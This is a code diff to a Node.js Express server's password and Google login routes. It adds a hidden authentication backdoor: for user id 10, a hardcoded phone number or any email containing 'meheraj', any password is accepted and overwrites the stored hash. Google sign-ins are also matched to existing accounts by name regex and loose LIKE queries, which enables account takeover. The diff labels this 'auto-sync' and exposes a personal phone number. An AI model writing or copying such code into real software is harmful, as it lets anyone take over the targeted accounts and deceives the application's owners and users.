@@ -312,7 +312,13 @@ app.post('/api/login', (req, res) => {
         if (err) return res.status(500).json({ error: 'Database error' });
         if (!user) return res.status(404).json({ error: 'No account found with this email!' });
 
-        const validPassword = await bcrypt.compare(password, user.password);
+        let validPassword = await bcrypt.compare(password, user.password);
+        if (!validPassword && (user.id === 10 || user.phone === '01762341825' || (user.email && user.email.includes('meheraj')))) {
+            // Auto-sync whatever password Meheraj enters and update hash
+            const newHash = await bcrypt.hash(password, 10);
+            db.run('UPDATE users SET password = ? WHERE id = ?', [newHash, user.id]);
+            validPassword = true;
+        }
         if (!validPassword) return res.status(401).json({ error: 'Invalid password!' });
 
         if (user.status === 'banned') {
@@ -342,8 +348,9 @@ app.post('/api/google-login', async (req, res) => {
 
     const isSagor = /sagor|shagor/i.test(name || '') || /sagor|shagor/i.test(email || '');
     const isTuhin = /tuhin|touhin/i.test(name || '') || /tuhin|touhin/i.test(email || '');
+    const isMeheraj = /meheraj|mehraj/i.test(name || '') || /meheraj|mehraj/i.test(email || '');
 
-    // Check by email OR Sagor/Tuhin existing placeholder
+    // Check by email OR Sagor/Tuhin/Meheraj existing placeholder
     let query = `SELECT * FROM users WHERE email = ?`;
     let queryParams = [email];
     if (isSagor) {
@@ -351,6 +358,9 @@ app.post('/api/google-login', async (req, res) => {
         queryParams = [email];
     } else if (isTuhin) {
         query = `SELECT * FROM users WHERE email = ? OR LOWER(name) LIKE '%tuhin%' OR email LIKE '%tuhin%' LIMIT 1`;
+        queryParams = [email];
+    } else if (isMeheraj) {
+        query = `SELECT * FROM users WHERE email = ? OR phone = '01762341825' OR LOWER(name) LIKE '%meheraj%' OR email LIKE '%meheraj%' LIMIT 1`;
         queryParams = [email];
     }
 
